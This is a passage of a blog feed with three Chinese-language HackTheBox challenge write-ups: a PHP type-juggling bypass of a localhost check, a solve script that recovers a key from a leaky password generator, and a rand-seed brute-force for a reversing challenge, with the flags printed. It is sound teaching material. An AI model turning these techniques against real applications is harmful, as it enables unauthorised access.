    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>這題是 web，我們逛一下網站後會看到沒有明顯的輸入點，但是有三個按鈕會呈現不同的頁面，我們來看一下 code。</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">spl_autoload_register</span>(function (<span class="variable">$name</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/Controller$/&#x27;</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="string">&quot;controllers/$&#123;name&#125;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/Model$/&#x27;</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="string">&quot;models/$&#123;name&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&quot;$&#123;name&#125;.php&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title class_">Database</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;M@k3l@R!d3s$&#x27;</span>, <span class="string">&#x27;web_juggling_facts&#x27;</span>);</span><br><span class="line"><span class="variable">$database</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$router</span> = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="variable">$router</span>-&gt;<span class="keyword">new</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;IndexController@index&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$router</span>-&gt;<span class="keyword">new</span>(<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;/api/getfacts&#x27;</span>, <span class="string">&#x27;IndexController@getfacts&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$router</span>-&gt;<span class="keyword">match</span>());</span><br></pre></td></tr></table></figure></div><p>上面可以看到他設定了兩種路由，一種是 GET &#x2F; 會呼叫 IndexController 類中的 index 方法，另一個是註冊一個 POST 方法的路由，URL 路徑為 &#x2F;api&#x2F;getfacts，當發送 POST 請求至 &#x2F;api&#x2F;getfacts 路徑時，會呼叫 IndexController 類中的 getfacts 方法。那我們接著就看 <code>challenge/controllers/IndexController.php</code>：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$router</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">view</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfacts</span>(<span class="params"><span class="variable">$router</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$jsondata</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( <span class="keyword">empty</span>(<span class="variable">$jsondata</span>) || !<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;type&#x27;</span>, <span class="variable">$jsondata</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Insufficient parameters!&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$jsondata</span>[<span class="string">&#x27;type&#x27;</span>] === <span class="string">&#x27;secrets&#x27;</span> &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Currently this type can be only accessed through localhost!&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$jsondata</span>[<span class="string">&#x27;type&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;secrets&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([</span><br><span class="line">                    <span class="string">&#x27;facts&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;facts-&gt;<span class="title function_ invoke__">get_facts</span>(<span class="string">&#x27;secrets&#x27;</span>)</span><br><span class="line">                ]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;spooky&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([</span><br><span class="line">                    <span class="string">&#x27;facts&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;facts-&gt;<span class="title function_ invoke__">get_facts</span>(<span class="string">&#x27;spooky&#x27;</span>)</span><br><span class="line">                ]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;not_spooky&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([</span><br><span class="line">                    <span class="string">&#x27;facts&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;facts-&gt;<span class="title function_ invoke__">get_facts</span>(<span class="string">&#x27;not_spooky&#x27;</span>)</span><br><span class="line">                ]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$router</span>-&gt;<span class="title function_ invoke__">jsonify</span>([</span><br><span class="line">                    <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Invalid type!&#x27;</span></span><br><span class="line">                ]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>上面提到在訪問 &#x2F;api&#x2F;getfacts 的時候會帶一個 type 的參數，根據不同的 case 會有不同的 response，其中有一個 type 是 secrets 他前面先檢查是否是本地存取，否的話就會 return 然後輸出警告。<br>那這邊就要提到 php 的一個問題，就是當我們使用兩個等號做比較的時候會被稱作 loose comparison，因為當兩個類型不同時 php 會嘗試幫我們轉型再做比較。<br>例如，0 &#x3D;&#x3D; ‘0’ 和 0 &#x3D;&#x3D; false 都會返回 true，因為在鬆散比較下 PHP 會將字符串和布爾值轉換成數字進行比較。<br>而當我們使用 &#x3D;&#x3D;&#x3D;：這會是一個 strict comparison，不會進行類型轉換。<br>嚴格比較要求值和類型都必須相同，否則結果為 false。<br>例如，0 &#x3D;&#x3D;&#x3D; ‘0’ 和 0 &#x3D;&#x3D;&#x3D; false 都會返回 false，因為類型不同（數字與字符串或布爾值），PHP 不會嘗試轉換它們。<br>那這邊放上一張圖片給大家參考：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*E-5cStZUndETrKec.png"                      alt="ref"                ><br>圖片來源：<a class="link"   href="https://blog.stackademic.com/the-curious-case-of-php-loose-comparisons-a-tale-of-a-b-and-c-70e6dff98c39" >https://blog.stackademic.com/the-curious-case-of-php-loose-comparisons-a-tale-of-a-b-and-c-70e6dff98c39 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>那我們就可以嘗試找到一個值是會在三個等號時不等於 ‘secrets’ 但是兩個等號會相等的，這種漏洞也叫做 Type Juggling Vulnerability 跟題目呼應，中文可能叫型別強制漏洞。<br>那我們就透過 true 來跟 “secrets” 做比較搭配 burp 來協助我們送封包，效果如下：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/juggling.png"                      alt="weak"                ></p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/juggling_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://cristi075.github.io/HTB-HackTheBoo-2022-Web4-Juggling-Facts" >https://cristi075.github.io/HTB-HackTheBoo-2022-Web4-Juggling-Facts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;這題是 web，我們逛一下網站後會看到沒有明顯的輸入點，但是</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="web" scheme="https://kazma.tw/tags/web/"/>
    
    <category term="php" scheme="https://kazma.tw/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges SPG Writeup</title>
    <link href="https://kazma.tw/2024/11/01/HackTheBox-Challenges-SPG-Writeup/"/>
    <id>https://kazma.tw/2024/11/01/HackTheBox-Challenges-SPG-Writeup/</id>
    <published>2024-11-01T10:03:28.954Z</published>
    <updated>2024-11-01T12:09:01.384Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>首先題目附給我們 <code>source.py</code> 以及 <code>output.txt</code>，其中程式的主邏輯如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG, MASTER_KEY</span><br><span class="line"></span><br><span class="line">ALPHABET = string.ascii_letters + string.digits + <span class="string">&quot;~!@#$%^&amp;*&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_password</span>():</span><br><span class="line">    master_key = <span class="built_in">int</span>.from_bytes(MASTER_KEY, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    password = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> master_key:</span><br><span class="line">        bit = master_key &amp; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> bit:</span><br><span class="line">            password += random.choice(ALPHABET[: <span class="built_in">len</span>(ALPHABET) // <span class="number">2</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password += random.choice(ALPHABET[<span class="built_in">len</span>(ALPHABET) // <span class="number">2</span> :])</span><br><span class="line">        master_key &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    password = generate_password()</span><br><span class="line">    encryption_key = sha256(MASTER_KEY).digest()</span><br><span class="line">    cipher = AES.new(encryption_key, AES.MODE_ECB)</span><br><span class="line">    ciphertext = cipher.encrypt(pad(FLAG, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(</span><br><span class="line">            <span class="string">f&quot;Your Password : <span class="subst">&#123;password&#125;</span>\nEncrypted Flag : <span class="subst">&#123;b64encode(ciphertext).decode()&#125;</span>&quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><p>我們來分析一下上面做了些什麼，首先他有一個 <code>generate_password()</code> 的函式把引入的 MASTER_KEY 來生成一組密碼。他先把 MASTER_KEY 用 little_endian 的格式轉成整數，接著從最低位開始若 bit 為 1 則從自定義的字母表前半部分挑一個字符加入 password，反之，若 bit 為 0 就從後半部挑一個字符，然後往高位移動一個重複前面的操作。再來 main 使用 MASTER_KEY 通過 SHA-256 雜湊算法生成加密金鑰 encryption_key，<code>sha256(MASTER_KEY).digest()</code> 會產生一個 256 位的摘要，這會用於之後 AES 加密的密鑰。<br>接著我們會使用生成的 encryption_key 初始化 AES 加密器，並選擇 ECB 模式。然後把 flag padding 到 16 位確保 AES 可以正常運作，然後執行加密後輸出 password 跟 flag。</p><p>那分析完後首先我們會想先想辦法得到 master_key，那根據他字母表的建立方式我們可以知道前半跟後半分別是：<code>abcdefghijklmnopqrstuvwxyzABCDEFGHI</code>，<code>JKLMNOPQRSTUVWXYZ0123456789~!@#$%^&amp;*</code>，所以我們可以透過 password 的每一位在前半或是後半知道 master_key 的每一個 bit 是 0 還是 1 如此就可以得到 master_key，接著就是正常的 AES 操作。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>最後按照剛剛的邏輯把腳本實現如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line">alph = string.ascii_letters + string.digits + <span class="string">&quot;~!@#$%^&amp;*&quot;</span></span><br><span class="line">first_half, second_half = <span class="built_in">set</span>(alph[:<span class="built_in">len</span>(alph) // <span class="number">2</span>]), <span class="built_in">set</span>(alph[<span class="built_in">len</span>(alph) // <span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_data</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        password = f.readline().split(<span class="string">&quot; : &quot;</span>)[<span class="number">1</span>].strip()</span><br><span class="line">        enc_flag = b64decode(f.readline().split(<span class="string">&quot; : &quot;</span>)[<span class="number">1</span>].strip())</span><br><span class="line">    <span class="keyword">return</span> password, enc_flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_master_key</span>(<span class="params">password</span>):</span><br><span class="line">    bits = [<span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> p <span class="keyword">in</span> first_half <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> p <span class="keyword">in</span> password]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(bits[::-<span class="number">1</span>]), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">master_key, enc_flag</span>):</span><br><span class="line">    encryption_key = sha256(long_to_bytes(master_key)[::-<span class="number">1</span>]).digest()</span><br><span class="line">    cipher = AES.new(encryption_key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> unpad(cipher.decrypt(enc_flag), <span class="number">16</span>).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    password, enc_flag = load_data()</span><br><span class="line">    master_key = recover_master_key(password)</span><br><span class="line">    flag = decrypt_flag(master_key, enc_flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Decrypted FLAG: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─ python solve.py                                      ─╯</span><br><span class="line">Decrypted FLAG: HTB&#123;m4ll34bl3_p4ssw0rd_g3n3r4t0r!&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/spg_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://github.com/hackthebox/htboo-ctf-2023/blob/main/htboo-ctf-2023/crypto/%5BVery%20Easy%5D%20SPG/README.md" >https://github.com/hackthebox/htboo-ctf-2023/blob/main/htboo-ctf-2023/crypto/%5BVery%20Easy%5D%20SPG/README.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;首先題目附給我們 &lt;code&gt;source.py&lt;/code</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="crypto" scheme="https://kazma.tw/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges FlagCasino Writeup</title>
    <link href="https://kazma.tw/2024/11/01/HackTheBox-Challenges-FlagCasino-Writeup/"/>
    <id>https://kazma.tw/2024/11/01/HackTheBox-Challenges-FlagCasino-Writeup/</id>
    <published>2024-11-01T09:16:21.217Z</published>
    <updated>2024-11-01T09:35:16.321Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>這是一題逆向，因為程式不長就直接放上來：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> input; <span class="comment">// [rsp+Bh] [rbp-5h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[ ** WELCOME TO ROBO CASINO **]&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;     ,     ,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;    (\\____/)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;     (_oo_)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;       (O)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;     __||__    \\)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;  []/______\\[] /\n&quot;</span></span><br><span class="line">    <span class="string">&quot;  / \\______/ \\/\n&quot;</span></span><br><span class="line">    <span class="string">&quot; /    /__\\\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(\\   /____\\\n&quot;</span></span><br><span class="line">    <span class="string">&quot;---------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*** PLEASE PLACE YOUR BETS ***]&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x1D</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot; %c&quot;</span>, &amp;input) != <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    srand(input);</span><br><span class="line">    <span class="keyword">if</span> ( rand() != check[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[ * INCORRECT * ]&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[ *** ACTIVATING SECURITY SYSTEM - PLEASE VACATE *** ]&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[ * CORRECT *]&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[ ** HOUSE BALANCE $0 - PLEASE COME BACK LATER ** ]&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>上面是 ida 反編譯的主程式邏輯，總之我們就是要連續輸入正確的亂數種子來符合 check 陣列裡的值，所以就是一個 flag checker，這裡我們來撰寫 exploit 來算出對應的亂數種子。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">mapping = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    libc.srand(i)</span><br><span class="line">    mapping[libc.rand()] = <span class="built_in">chr</span>(i)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">casino = ELF(<span class="string">&quot;./casino&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    val = casino.u32(casino.sym[<span class="string">&quot;check&quot;</span>] + b * <span class="number">4</span>)</span><br><span class="line">    flag += mapping[val]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><p>首先我們載入 <code>ctypes</code> 讓 python 可以呼叫 C 標準函式庫中的函數。<br>然後使用 ctypes.CDLL 函數來加載 Linux 的 C 標準函式庫 libc.so.6，這樣加載後的 libc 物件就可以直接呼叫 C 標準庫中的函數，例如題目中用到的 srand() 和 rand()。<br>然後我們遞迴 ascii 的範圍建一個字典，再來我們可以透過 ida 觀察到 check 陣列觀察到有 30 個 4 bytes，所以這裡我們可以把 casino 用 pwntools 載進來之後透過 u32 以及一次移動我們的指針四個單位來找到對應的隨機種子，最後印出我們的 flag。</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─ file casino                                          ─╯</span><br><span class="line">casino: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, 